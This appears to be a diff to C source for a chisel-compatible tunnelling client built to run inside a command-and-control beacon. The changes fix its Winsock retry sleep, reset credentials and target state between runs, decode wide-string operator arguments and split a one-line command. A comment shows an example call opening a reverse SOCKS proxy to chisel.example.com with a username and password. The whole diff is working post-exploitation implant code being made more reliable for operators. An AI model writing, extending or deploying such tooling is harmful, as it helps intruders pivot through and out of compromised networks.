@@ -530,11 +530,26 @@ static unsigned long long backoff_ms(int n){
     return min_ri + (unsigned long long)(rnd() % (unsigned long long)(base - min_ri + 1));
 }
 static void sleep_ms(unsigned long long ms){
-    /* select() sleep in <=2 s slices: a beacon thread parked in one long select is
-       indistinguishable from a wedged one, and the beacon polls this thread. */
-    while(ms){ tv1 bs; unsigned long long chunk = (ms>2000)?2000:ms;
-      bs.sec=(long)(chunk/1000); bs.usec=(long)((chunk%1000)*1000);
-      select(0,0,0,0,&bs); ms-=chunk; }
+    /* Winsock does NOT implement the NULL-set sleep idiom: `select(0,0,0,0,&tv)` returns
+       -1/WSAEINVAL at once, and an empty fd_set is rejected the same way (measured: the retry
+       loop printed "waiting 2000 ms" and redialled immediately, so the backoff existed only on
+       paper and every redial storm was spaced only by the phase timeouts).  The wait has to be a
+       real select on a real socket that nobody will ever write to, which times out honestly.
+       Slices stay <= 2 s: a beacon thread parked in one long select is indistinguishable from a
+       wedged one, and the beacon polls this thread. */
+    int sd = socket(2,0,0);              /* AF_INET, default type/protocol, blocking: never written */
+    while(ms){
+        tv1 bs; fd_set1 rs; unsigned long long chunk = (ms>2000)?2000:ms;
+        if(sd<0){ /* no socket to park on (fd exhaustion): burn a bounded slice so the retry rate
+                     stays bounded instead of degrading into the storm this function prevents. */
+            unsigned long long t0=now_ms(); while(now_ms()-t0 < 250){}
+            ms = (ms>250) ? ms-250 : 0; continue; }
+        rs.fd_count=1; rs.fd_array[0]=(unsigned long long)sd;
+        bs.sec=(long)(chunk/1000); bs.usec=(long)((chunk%1000)*1000);
+        select(0,(void*)&rs,0,0,(void*)&bs);
+        ms-=chunk;
+    }
+    if(sd>=0) closesocket(sd);
 }
 /* 0 = caller should redial (already waited), 1 = budget exhausted, stop.
  * chisel counts the connection attempt that just failed before deciding
@@ -668,6 +683,15 @@ static int stock_run(int argc, char **argv)
      *   ws 45s / ssh 30s         client_connect.go WS_TIMEOUT / client.go SSH_TIMEOUT
      *   dial 8s                  this payload's measured bound (see conntimeo above) */
     unsigned long long kams=25000, katoms=0, wstimeo=45000, sshtimeo=30000;
+    /* Start every call from a clean slate.  The buffers above live in .bss (static so a DIAG build's
+       ring logger and gdb can name them at a fixed address) and the retry/backoff counters are
+       file-scope, so they outlive a run: a beacon is free to call go() again in the same process, and
+       run #2 must not inherit run #1's credentials, target, udp remote, host-verification mode, or
+       backoff counter (an inherited counter makes a bounded run give up on its first bad attempt, and
+       an inherited --max-retry-count silently changes how long the operator waits). */
+    user[0]=0; pass[0]=0; thost[0]=0; urehost[0]=0; cparg(ver,"1.12.1",16);
+    tport=-1; ubind=-1; ureport=-1; hv_mode=0;
+    attempts=0; max_rc=-1; min_ri=1000; max_ri=300000; conntimeo=8000;
     for(a=0;a<argc;a++){
         const char *k=argv[a];
         if(!k||!k[0]) continue;
@@ -689,7 +713,11 @@ static int stock_run(int argc, char **argv)
         else if(flagis(k,"--ssh-timeout")&&a+1<argc){ if(parseds(argv[++a],&sshtimeo)){ OUT("bad --ssh-timeout %s\n",argv[a]); return 7; } continue; }
         else if(flagis(k,"--min-retry-interval")&&a+1<argc){ if(parseds(argv[++a],&min_ri)){ OUT("bad --min-retry-interval %s\n",argv[a]); return 7; } continue; }
         else if(flagis(k,"--max-retry-interval")&&a+1<argc){ if(parseds(argv[++a],&max_ri)){ OUT("bad --max-retry-interval %s\n",argv[a]); return 7; } continue; }
-        else if(flagis(k,"--max-retry-count")&&a+1<argc){ max_rc=inum(argv[++a]); if(max_rc<0) max_rc=-1; continue; }
+        else if(flagis(k,"--max-retry-count")&&a+1<argc){
+            /* chisel's gate is `MaxRetries > 0` (client.go connectionLoop), so 0 AND any negative
+               value mean unlimited; a positive n caps the attempts.  Mirroring that keeps a working
+               `chisel client --max-retry-count 0 ...` line transferring unchanged. */
+            max_rc=inum(argv[++a]); if(max_rc<=0) max_rc=-1; continue; }
         else if(flagis(k,"--port")&&a+1<argc) sport=num(argv[++a]);
         else if(flagis(k,"--listen")&&a+1<argc) lport=num(argv[++a]);
         else if(flagis(k,"--ver")&&a+1<argc) cparg(ver, argv[++a], 16);
@@ -888,13 +916,55 @@ int main(int argc, char **argv){ return stock_run(argc, argv); }
    flags (or worse, `--auth`) were quietly ignored and the payload ran with defaults; measured on
    a stalled process: SO_RCVTIMEO installed at the 45 s default while the command line said 3 s.
    Truncation is now an error (return 6, nothing runs): a missing --auth must not look like a
-   working proxy.  Cost: 24*512 B of .data. */
+   working proxy.  1024 B per record so a whole command line fits in ONE record (see pe_tokenize);
+   cost: 24*1024 B of .data. */
 #define PE_MAXARG 24
-#define PE_ARGMAX 512
+#define PE_ARGMAX 1024
 static char pe_argbuf[PE_MAXARG][PE_ARGMAX];
 static char *pe_argv[PE_MAXARG];
 static unsigned pe_ld32(const unsigned char *b)
 { return (unsigned)b[0]|((unsigned)b[1]<<8)|((unsigned)b[2]<<16)|((unsigned)b[3]<<24); }
+/* OST's `Z` type is a zero-terminated WIDE string, so a 'Z' record carries the ASCII letters with
+   0x00 between them.  Everything chisel speaks is ASCII, so a record is taken as UTF-16LE when it
+   is at least 4 bytes, starts printable, and has 0x00 at every odd offset; it is then collapsed to
+   8-bit while copying.  This has to be a per-record guess: the buffer carries no type information,
+   so a mix of 'z' and 'Z' records still works.  A real narrow record never matches (its odd bytes
+   are printable too), and short records are left alone. */
+static int pe_iswide(const unsigned char *b, int l){
+    int i;
+    if(l<4) return 0;
+    if(b[0]<' '||b[0]>='~') return 0;
+    for(i=1;i<l;i+=2) if(b[i]) return 0;
+    return 1;
+}
+/* One record holding a whole command line is split in place on ASCII blanks into pe_argv[]:
+     exec_bof z "https://chisel.example.com R:1080:socks auth ops:pass max-retry-count 5"
+   '"' toggles quoting and the quote characters themselves are dropped, so a value may contain
+   spaces (auth "u:p with spaces").  No escapes, no globs, no expansion - this is not a shell.
+   Reachable only when the buffer held exactly ONE record, which can never be a valid record-form
+   list (chisel always needs URL + remote), so the two forms cannot collide.  More than PE_MAXARG
+   tokens or an unterminated quote is an error, same refuse-don't-truncate rule as the record walk. */
+static int pe_tokenize(char *s){
+    int n=0, inq=0; char *r=s, *w=s;
+    for(;;){
+        while(*r==' '||*r=='\t') r++;    /* only reachable outside quotes (see below) */
+        if(!*r) break;
+        if(n>=PE_MAXARG) return -1;
+        w=r; pe_argv[n++]=w;             /* a token's final start is where its copying begins */
+        while(*r){
+            if(*r=='\"'){ inq=!inq; r++; continue; }
+            if(!inq&&(*r==' '||*r=='\t')) break;
+            *w++=*r++;
+        }
+        /* Close the token only AFTER stepping r past the separator: when no quote characters were
+           dropped, w == r, and writing the terminator first would overwrite the blank that has to
+           be skipped, ending the scan one token short. */
+        if(!inq) while(*r==' '||*r=='\t') r++;
+        *w++=0;
+    }
+    if(inq) return -1;
+    return n;
+}
 static int pe_args(const unsigned char *b, int len, int use_hdr)
 {
     int n=0, l;
@@ -910,10 +980,17 @@ static int pe_args(const unsigned char *b, int len, int use_hdr)
         if(l<=0||l>len) return -1;
         /* Length-driven copy, never NUL-driven: a `z` record carries its own NUL inside
            `l`, a `b` (raw bytes) record does not, and a `z` record with the NUL missing
-           must not read into the following record.  The terminator is added here. */
-        { int m = (l < PE_ARGMAX-1) ? l : PE_ARGMAX-1, i2;
-          for(i2=0;i2<m;i2++) pe_argbuf[n][i2]=(char)b[i2];
-          pe_argbuf[n][m]=0; }
+           must not read into the following record.  The terminator is added here.  Wide
+           ('Z') records are collapsed to 8-bit on the way in (see pe_iswide). */
+        if(pe_iswide(b,l)){
+            int m = ((l+1)/2 < PE_ARGMAX-1) ? (l+1)/2 : PE_ARGMAX-1, i2;
+            for(i2=0;i2<m;i2++) pe_argbuf[n][i2]=(char)b[2*i2];
+            pe_argbuf[n][m]=0;
+        } else {
+            int m = (l < PE_ARGMAX-1) ? l : PE_ARGMAX-1, i2;
+            for(i2=0;i2<m;i2++) pe_argbuf[n][i2]=(char)b[i2];
+            pe_argbuf[n][m]=0;
+        }
         pe_argv[n]=pe_argbuf[n]; n++;
         b+=l; len-=l;
     }
@@ -932,8 +1009,11 @@ int go(const char *data, int len)
     int n;
     if(!data||len<8) return 6;
     n=pe_args(b, len, 1);
-    if(n<2) n=pe_args(b, len, 0);
-    if(n<2) return 6;
+    if(n<1) n=pe_args(b, len, 0);
+    if(n<1) return 6;
+    /* exactly one record: it is a whole command line, and splitting it is OUR job, so chisel's
+       dashed spellings are legal in that form (the C2 never sees a token starting with '-'). */
+    if(n==1){ n=pe_tokenize(pe_argbuf[0]); if(n<2) return 6; }
     return stock_run(n, pe_argv);
 }
 #else
